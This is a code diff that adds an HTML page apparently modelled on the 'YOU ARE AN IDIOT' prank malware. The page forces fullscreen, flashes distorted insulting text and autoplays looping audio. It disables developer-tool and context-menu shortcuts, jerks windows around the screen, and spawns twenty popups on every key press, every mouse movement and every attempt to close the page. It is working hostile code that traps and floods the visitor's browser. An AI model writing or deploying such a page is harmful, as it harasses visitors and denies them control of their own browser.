@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>!$#%T$^%$&*7</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #000000;
+            flex-direction: column;
+        }
+        #text {
+            font-size: 100px;
+            color: #7206ff;
+            text-align: center;
+            display: none; /* Hide text initially */
+        }
+        audio {
+            display: none; /* Hide audio player */
+        }
+    </style>
+</head>
+<body>
+    <div id="text">YOU ARE AN IDIOT</div>
+    <audio id="audioPlayer" src="music.mp3" autoplay loop></audio>
+
+    <script>
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U') || e.ctrlKey || e.shiftKey) {
+                e.preventDefault();
+            }
+        });
+
+        function startEverything() {
+            const textElement = document.getElementById('text');
+            textElement.style.display = 'block';
+
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) { 
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) { 
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) { 
+                document.documentElement.msRequestFullscreen();
+            }
+
+            function zalgoify(text) {
+                const zalgoUp = ['̍','̎','̄','̅','̿','̑','̐','͒','͗','͑','̇','̈','̊','͂','̓','̈́','͊','͋','͌','̃','̂','̌','͐','̀','́','̋','̏','̽','̉','ͣ','ͤ','ͥ','ͦ','ͧ','ͨ','ͩ','ͪ','ͫ','ͬ','ͭ','ͮ','ͯ','̾','͛','͆','̚'];
+                const zalgoMid = ['̕','̛','̀','́','͘','̡','̢','̧','̨','̴','̵','̶','͏','͜','͝','͞','͟','͠','͢','̸','̷','͡','҉'];
+                const zalgoDown = ['̖','̗','̘','̙','̜','̝','̞','̟','̠','̤','̥','̦','̩','̪','̫','̬','̭','̮','̯','̰','̱','̲','̳','̹','̺','̻','̼','ͅ','͇','͈','͉','͍','͎','͓','͔','͕','͖','͙','͚','̣'];
+                const zalgoRandom = (arr) => arr[Math.floor(Math.random() * arr.length)];
+                let result = '';
+                for (const char of text) {
+                    result += char;
+                    for (let i = 0; i < Math.floor(Math.random() * 4); i++) {
+                        result += zalgoRandom(zalgoUp);
+                    }
+                    for (let i = 0; i < Math.floor(Math.random() * 2); i++) {
+                        result += zalgoRandom(zalgoMid);
+                    }
+                    for (let i = 0; i < Math.floor(Math.random() * 3); i++) {
+                        result += zalgoRandom(zalgoDown);
+                    }
+                }
+                return result;
+            }
+
+            function updateZalgoText() {
+                const originalText = "YOU ARE AN IDIOT";
+                textElement.innerHTML = zalgoify(originalText);
+            }
+            setInterval(updateZalgoText, 10);
+
+            const audioPlayer = document.getElementById('audioPlayer');
+            audioPlayer.play(); // Start audio playback
+        }
+
+        window.onload = startEverything;
+
+        let popups = [window];
+
+        function getRandomCoordinates() {
+            return [Math.floor(Math.random() * (screen.width - 10)), Math.floor(Math.random() * (screen.height - 100))];
+        }
+
+        setInterval(() => {
+            if (popups.length != 0) {
+                for (let i = 0; i < popups.length; i++) {
+                    let xy = getRandomCoordinates();
+                    popups[i].moveTo(xy[0], xy[1]);
+                    popups[i].focus();
+                }
+            }
+        }, 50);
+
+        function createNewPopUp() {
+            let newWindow = window.open('лол.html', '', 'width=350 height=200');
+            popups.push(newWindow);
+        }
+
+        window.addEventListener('beforeunload', (e) => {
+            for (let i = 0; i < 20; i++) {
+                createNewPopUp();
+            }
+            e.preventDefault();
+            e.returnValue = '';
+        });
+
+        window.addEventListener('load', () => {
+            let h = window.innerHeight;
+            document.getElementById('text').style.marginTop = (h / 2 - 120) + "px";
+        });
+
+        window.addEventListener('resize', () => {
+            let h = window.innerHeight;
+            document.getElementById('text').style.marginTop = (h / 2 - 120) + "px";
+        });
+
+        document.addEventListener('click', () => {});
+
+        document.addEventListener('mouseenter', () => {});
+
+        document.addEventListener('keydown', (e) => {
+            for (let i = 0; i < 20; i++) {
+                createNewPopUp();
+            }
+            e.preventDefault();
+        });
+
+        document.addEventListener('mousemove', (e) => {
+            for (let i = 0; i < 20; i++) {
+                createNewPopUp();
+            }
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
